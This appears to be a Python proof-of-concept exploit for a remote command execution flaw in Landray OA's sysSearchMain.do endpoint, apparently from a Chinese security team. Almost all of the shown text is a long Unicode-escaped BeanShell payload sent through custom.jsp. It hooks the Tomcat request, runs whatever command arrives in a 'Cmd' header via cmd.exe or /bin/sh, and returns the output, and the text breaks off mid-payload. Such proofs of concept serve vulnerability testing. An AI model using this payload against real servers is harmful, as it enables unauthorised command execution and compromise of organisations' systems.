'''
Function:
    蓝凌OA sysSearchMain.do 远程命令执行漏洞
Author:
    spmonkey，夜梓月
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/sys/ui/extend/varkind/custom.jsp".format(scheme, netloc)
        data = 'var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void class="bsh.Interpreter"><void%20method=%22eval%22><string>\\u0020\\u0020\\u0020\\u0020\\u0062\\u006f\\u006f\\u006c\\u0065\\u0061\\u006e\\u0020\\u0066\\u006c\\u0061\\u0067\\u0020\\u003d\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u0020\\u003d\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0028\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0072\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u002e\\u0046\\u0069\\u0065\\u006c\\u0064\\u0020\\u0066\\u0020\\u003d\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0020\\u003d\\u0020\\u0028\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0029\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0067\\u0072\\u006f\\u0075\\u0070\\u0029\\u003b\\u0066\\u006f\\u0072\\u0020\\u0028\\u0069\\u006e\\u0074\\u0020\\u0069\\u0020\\u003d\\u0020\\u0030\\u003b\\u0020\\u0069\\u0020\\u003c\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u003b\\u0020\\u0069\\u002b\\u002b\\u0029\\u0020\\u007b\\u0020\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0020\\u0074\\u0020\\u003d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u005b\\u0069\\u005d\\u003b\\u0069\\u0066\\u0020\\u0028\\u0074\\u0020\\u003d\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0073\\u0074\\u0072\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0028\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0065\\u0078\\u0065\\u0063\\u0022\\u0029\\u0020\\u007c\\u007c\\u0020\\u0021\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0068\\u0074\\u0074\\u0070\\u0022\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0061\\u0072\\u0067\\u0065\\u0074\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0074\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0021\\u0028\\u006f\\u0062\\u006a\\u0020\\u0069\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u006f\\u0066\\u0020\\u0052\\u0075\\u006e\\u006e\\u0061\\u0062\\u006c\\u0065\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0069\\u0073\\u0024\\u0030\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u003b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0068\\u0061\\u006e\\u0064\\u006c\\u0065\\u0072\\u0022\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u004e\\u006f\\u0053\\u0075\\u0063\\u0068\\u0046\\u0069\\u0065\\u006c\\u0064\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0029\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0053\\u0075\\u0070\\u0065\\u0072\\u0063\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0053\\u0075\\u0070\\u0065\\u0072\\u0063\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0068\\u0061\\u006e\\u0064\\u006c\\u0065\\u0072\\u0022\\u0029\\u003b\\u0020\\u007d\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u003b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0053\\u0075\\u0070\\u0065\\u0072\\u0063\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0022\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u004e\\u006f\\u0053\\u0075\\u0063\\u0068\\u0046\\u0069\\u0065\\u006c\\u0064\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0029\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0022\\u0029\\u003b\\u0020\\u007d\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u003b\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u004c\\u0069\\u0073\\u0074\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u0020\\u003d\\u0020\\u0028\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u004c\\u0069\\u0073\\u0074\\u0029\\u0020\\u0028\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u0029\\u003b\\u0066\\u006f\\u0072\\u0020\\u0028\\u0069\\u006e\\u0074\\u0020\\u006a\\u0020\\u003d\\u0020\\u0030\\u003b\\u0020\\u006a\\u0020\\u003c\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u002e\\u0073\\u0069\\u007a\\u0065\\u0028\\u0029\\u003b\\u0020\\u002b\\u002b\\u006a\\u0029\\u0020\\u007b\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0020\\u003d\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u002e\\u0067\\u0065\\u0074\\u0028\\u006a\\u0029\\u003b\\u0066\\u0020\\u003d\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0072\\u0065\\u0071\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0072\\u0065\\u0071\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0072\\u0065\\u0073\\u0070\\u0020\\u003d\\u0020\\u0072\\u0065\\u0071\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0067\\u0065\\u0074\\u0052\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u0030\\u005d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0071\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u0030\\u005d\\u0029\\u003b\\u0073\\u0074\\u0072\\u0020\\u003d\\u0020\\u0028\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0029\\u0020\\u0072\\u0065\\u0071\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0071\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u0022\\u0043\\u006d\\u0064\\u0022\\u007d\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0073\\u0074\\u0072\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0020\\u0026\\u0026\\u0020\\u0021\\u0073\\u0074\\u0072\\u002e\\u0069\\u0073\\u0045\\u006d\\u0070\\u0074\\u0079\\u0028\\u0029\\u0029\\u0020\\u007b\\u0020\\u0072\\u0065\\u0073\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0073\\u0065\\u0074\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0069\\u006e\\u0074\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0073\\u0070\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0032\\u0030\\u0030\\u0029\\u007d\\u0029\\u003b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005b\\u005d\\u0020\\u0063\\u006d\\u0064\\u0073\\u0020\\u003d\\u0020\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u002e\\u0067\\u0065\\u0074\\u0050\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0028\\u0022\\u006f\\u0073\\u002e\\u006e\\u0061\\u006d\\u0065\\u0022\\u0029\\u002e\\u0074\\u006f\\u004c\\u006f\\u0077\\u0065\\u0072\\u0043\\u0061\\u0073\\u0065\\u0028\\u0029\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u0022\\u0029\\u0020\\u003f\\u0020\\u006e\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005b\\u005d\\u007b\\u0022\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065\\u0022\\u002c\\u0020\\u0022\\u002f\\u0063\\u0022\\u002c\\u0020\\u0073\\u0074\\u0072\\u007d\\u0020\\u003a\\u0020\\u006e\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005b\\u005d\\u007b\\u0022\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068\\u0022\\u002c\\u0020\\u0022\\u002d\\u0063\\u0022\\u002c\\u0020\\u0073\\u0074\\u0072\\u007d\\u003b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0020\\u003d\\u0020\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u002e\\u0067\\u0065\\u0074\\u0050\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0028\\u0022\\u006f\\u0073\\u002e\\u006e\\u0061\\u006d\\u0065\\u0022\\u0029\\u002e\\u0074\\u006f\\u004c\\u006f\\u0077\\u0065\\u0072\\u0043\\u0061\\u0073\\u0065\\u0028\\u0029\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u0022\\u0029\\u0020\\u003f\\u0020\\u0022\\u0047\\u0042\\u004b\\u0022\\u003a\\u0022\\u0055\\u0054\\u0046\\u002d\\u0038\\u0022\\u003b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u0020\\u0074\\u0065\\u0078\\u0074\\u0032\\u0020\\u003d\\u0028\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u0053\\u0063\\u0061\\u006e\\u006e\\u0065\\u0072\\u0028\\u0028\\u006e\\u0065\\u0077\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072\\u0028\\u0063\\u006d\\u0064\\u0073\\u0029\\u0029\\u002e\\u0073\\u0074\\u0061\\u0072\\u0074\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u002c\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0029\\u0029\\u002e\\u0075\\u0073\\u0065\\u0044\\u0065\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0072\\u0028\\u0022\\u005c\\u005c\\u0041\\u0022\\u0029\\u002e\\u006e\\u0065\\u0078\\u0074\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0029\\u003b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u0020\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u003d\\u0028\\u0022\\u0045\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u003a\\u0020\\u0020\\u0020\\u0020\\u0022\\u002b\\u006e\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0074\\u0065\\u0078\\u0074\\u0032\\u002c\\u0022\\u0075\\u0074\\u0066\\u002d\\u0038\\u0022\\u0029\\u0029\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0029\\u003b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u0020\\u0063\\u006c\\u0073\\u0020\\u003d\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0022\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0074\\u006f\\u006d\\u0063\\u0061\\u0074\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u0062\\u0075\\u0066\\u002e\\u0042\\u0079\\u0074\\u0065\\u0043\\u0068\\u0075\\u006e\\u006b\\u0022\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0063\\u006c\\u0073\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u003b\\u0063\\u006c\\u0073\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0073\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u002c\\u0020\\u0069\\u006e\\u0074\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u002c\\u0020\\u0069\\u006e\\u0074\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u006f\\u0062\\u006a\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0030\\u0029\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0029\\u007d\\u0029\\u003b\\u0072\\u0065\\u0073\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0064\\u006f\\u0057\\u0072\\u0069\\u0074\\u0065\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0063\\u006c\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0073\\u0070\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u006f\\u0062\\u006a\\u007d\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u004e\\u006f\\u0053\\u0075\\u0063\\u0068\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0076\\u0061\\u0072\\u0035\\u0029\\u0020\\u007b\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u0020\\u0063\\u006c\\u0073\\u0020\\u003d\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0022\\u006a\\u0061\\u0076\\u0061\\u002e\\u006e\\u0069\\u006f\\u002e\\u0042\\u0079\\u0074\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0022\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0063\\u006c\\u0073\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0077\\u0072\\u0061\\u0070\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0063\\u006c\\u0073\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u007d\\u0029\\u003b\\u0072\\u0065\\u0073\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0064\\u006f\\u0057\\u0072\\u0069\\u0074\\u0065\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0063\\u006c\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0073\\u0070\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u006f\\u0062\\u006a\\u007d\\u0029\\u003b\\u0020\\u007d\\u0066\\u006c\\u0061\\u0067\\u0020\\u003d\\u0020\\u0074\\u0072\\u0075\\u0065\\u003b\\u0020\\u007d\\u0069\\u0066\\u0020\\u0028\\u0066\\u006c\\u0061\\u0067\\u0029\\u0020\\u007b\\u0020\\u0062\\u0072\\u0065\\u0061\\u006b\\u003b\\u0020\\u007d\\u0020\\u007d\\u0069\\u0066\\u0020\\u0028\\u0066\\u006c\\u0061\\u0067\\u0029\\u0020\\u007b\\u0020\\u0062\\u0072\\u0065\\u0061\\u006b\\u003b\\u0020\\u007d\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u00